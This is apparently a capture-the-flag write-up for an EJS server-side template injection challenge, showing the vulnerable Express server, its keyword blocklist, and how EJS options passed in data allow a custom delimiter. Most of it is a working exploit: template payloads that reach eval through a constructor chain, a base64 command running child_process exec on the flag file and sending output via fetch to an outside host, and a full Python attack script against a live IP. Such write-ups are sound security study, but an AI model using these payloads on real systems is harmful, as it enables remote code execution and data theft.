---
created: 2026-03-14T10:04
updated: 2026-03-15T01:15
points: 166
solves: 32
---

This is a EJS SSTI challenge but with very very restricted charset.

We can define the template, and the data supplied.

```js
const express = require("express");
const ejs = require("ejs");
const app = express();

const NAME_ALLOW = /^[a-zA-Z0-9<>()[\]-]+$/;
const DATA_ALLOW = /^[a-zA-Z0-9\s"{}:,/*]+$/;
const BLOCK =
  /this|arguments|include|eval|Function|String|Buffer|constructor|prototype|process|global|mainModule|require|import|child|exec|spawn|env|flag|atob|btoa/i;

app.get("/", (req, res) => {
  const name = req.query.name ?? "world";
  const dataText = req.query.data ?? "{}";

  if (
    name.length > 80 ||
    !NAME_ALLOW.test(name) ||
    !DATA_ALLOW.test(dataText) ||
    BLOCK.test(name) ||
    BLOCK.test(dataText)
  ) {
    return res.status(403).send("Blocked");
  }

  let data;
  try {
    data = JSON.parse(dataText);
  } catch {
    return res.status(400).send("Bad JSON");
  }

  try {
    res.send(ejs.render(`<h1>Hello, ${name}</h1>`, data));
  } catch (e) {
    res
      .status(500)
      .send("Internal Server Error\n" + e.message + "\n" + e.stack);
  }
});

app.listen(3000);
```

At first I was very confused because the EJS template `<%` is not allowed at all, but then I realized that EJS will use data for options as well (after reading their source code on github), which allows me to set `delimiter` to `a` and I can do template injection with `<a ... a>`.

To solve any JS jail we should probably try to get `Function` or `eval`, we can get to `Function.constructor` by just traversing the prototype of some string.

```js
"".slice.constructor("return eval")()("CODE");
```

> Don't question why I am returning `eval` from a function that is literally already capable of running the code.

And in payload form that would be:

```python
params = {
    # "".slice.constructor("return eval")()("1*1")
    "name": '<a(e[s][Object[k](C)[j](e)](Object[k](P)[j](e))()(Q))a>',
    "data": json.dumps({
        "delimiter": "a",
        "debug": True,
        "e": "",
        "j": "join",
        "k": "keys",
        "s": "slice",
        "C": {'constr': '', 'uctor': ''},
        "P": {'return eva': '', 'l': ''},
        "Q": "1*1"
    })
}
```

As you can see I am using `Object.keys(obj).join("")` to bypass blacklists.

Now if we just wrap this outside the same thing but with `atob` and we would have `eval(atob("BASE64CODE"))` and we can execute arbitrary cod... wait, the payload is already 57 chars, we are only allowed 80 chars.

Some rabbit holes later I realized that I was wasting a lot of chars with `Object.keys(obj).join("")`, instead I can just use `"a".concat("b")`.

The solution is hence very clear, and the final template payload is just 57 characters!

> Some minor space adjustments might be needed in the payload code to avoid `+` appearing in the base64 encoding.

```python

params = {
    # "".slice.constructor("return eval")()(
    #        "".slice.constructor("return atob")()( B )
    # )
    "name": '<ae[s][C[c](D)](E[c](F))()(e[s][C[c](D)](G[c](H))()(B))a>',
    "data": json.dumps({
        "delimiter": "a",
        "debug": True,
        "cache": True,
        "compileDebug": True,
        "root": "/",
        "views": "/",
        "e": "",
        "c": "concat",
        "j": "join",
        "k": "keys",
        "l": "log",
        "s": "slice",
        "B": base64.b64encode(b"import('child_process').then(a=>a.exec('cat /flag-266320ee2ad4c4b174205373b089c2b0.txt',(e,s)=>fetch('https://1337.yun.ng/?d='+btoa(s))))").decode()
        .replace("=", ""),
        "T": {'toS': '', 'tring': ''},
        "C": "constr",
        "D": "uctor",
        "E": "return e",
        "F": "val",
        "G": "return ato",
        "H": "b",
    })
}
```

```flag
tkbctf{n1c3_t0_m33t_y0u!_h0w_d1d_y0u_f1nd_m3?}
```

```python
import base64
import json
import re
from server import webhook
import requests

target = "http://localhost:3000/"
target = "http://35.194.108.145:26529/"
# params = {
#     # "".slice.constructor("return eval")()("1*1")
#     "name": '<a(e[s][Object[k](C)[j](e)](Object[k](P)[j](e))()(Q))a>',
#     "data": json.dumps({
#         "delimiter": "a",
#         "debug": True,
#         "e": "",
#         "j": "join",
#         "k": "keys",
#         "s": "slice",
#         "C": {'constr': '', 'uctor': ''},
#         "P": {'return eva': '', 'l': ''},
#         "Q": "1*1"
#     })
# }


"""
Object[k](P)[j](e)
490837.
"""

params = {
    # "".slice.constructor("return eval")()(
    #        "".slice.constructor("return atob")()( B )
    # )
    "name": '<ae[s][C[c](D)](E[c](F))()(e[s][C[c](D)](G[c](H))()(B))a>',
    "data": json.dumps({
        "delimiter": "a",
        "debug": True,
        "cache": True,
        "compileDebug": True,
        "root": "/",
        "views": "/",
        "e": "",
        "c": "concat",
        "j": "join",
        "k": "keys",
        "l": "log",
        "s": "slice",
        "B": base64.b64encode(b"import('child_process').then(a=>a.exec('cat /flag-266320ee2ad4c4b174205373b089c2b0.txt',(e,s)=>fetch('https://1337.yun.ng/?d='+btoa(s))))").decode()
        .replace("=", ""),
        "T": {'toS': '', 'tring': ''},
        "C": "constr",
        "D": "uctor",
        "E": "return e",
        "F": "val",
        "G": "return ato",
        "H": "b",
    })
}

stop, wait = webhook(1337)
print(len(params["name"]))
print(params['data'])
NAME_ALLOW = r"^[a-zA-Z0-9<>()[\]-]+$"
DATA_ALLOW = r"^[a-zA-Z0-9\s\"{}:,/*]+$"
BLOCK = r"(?i)(this|arguments|include|eval|Function|String|Buffer|constructor|prototype|process|global|mainModule|require|import|child|exec|spawn|env|flag|atob|btoa)"

if not re.match(NAME_ALLOW, params["name"]):
    print("bad chars in name")
    for m in re.finditer(r"[^a-zA-Z0-9<>()[\]-]", params["name"]):
        print("Invalid char:", m.group(0))
if not re.match(DATA_ALLOW, params["data"]):
    print("bad chars in data")
    for m in re.finditer(r"[^a-zA-Z0-9\s\"{}:,/*]", params["data"]):
        print("Invalid char:", m.group(0))
if re.search(BLOCK, params["name"]):
    print("Blocked name")
    for m in re.finditer(BLOCK, params["name"]):
        print("Blocked keyword:", m.group(0))
if re.search(BLOCK, params["data"]):
    print("Blocked data")
    for m in re.finditer(BLOCK, params["data"]):
        print("Blocked keyword:", m.group(0))

print(requests.get(target, params=params).text)

data = wait()
print(data)
print(base64.b64decode(data['d'][0]).decode())

stop()
# tkbctf{n1c3_t0_m33t_y0u!_h0w_d1d_y0u_f1nd_m3?}
```
